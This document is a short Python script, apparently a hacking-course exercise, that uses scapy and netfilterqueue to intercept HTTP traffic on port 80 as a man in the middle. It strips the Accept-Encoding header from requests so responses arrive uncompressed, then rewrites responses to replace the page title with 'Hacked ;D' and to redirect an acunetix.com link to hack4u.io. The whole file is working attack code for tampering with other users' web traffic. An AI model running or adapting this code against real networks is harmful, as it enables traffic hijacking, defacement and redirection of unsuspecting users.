#!/usr/bin/env python3

import scapy.all as scapy
import os
import netfilterqueue
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                modified_load1 = re.sub(b"<title>.*?</title>", b"<title>Hacked ;D</title>", scapy_packet[scapy.Raw].load)
                modified_load2 = re.sub(b'<a href="https://www.acunetix.com/">', b'<a href="https://hack4u.io">', modified_load1)
                new_packet = set_load(scapy_packet, modified_load1)
                new_packet = set_load(new_packet, modified_load2)
                packet.set_payload(new_packet.build())

    packet.accept()

def main():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
    main()
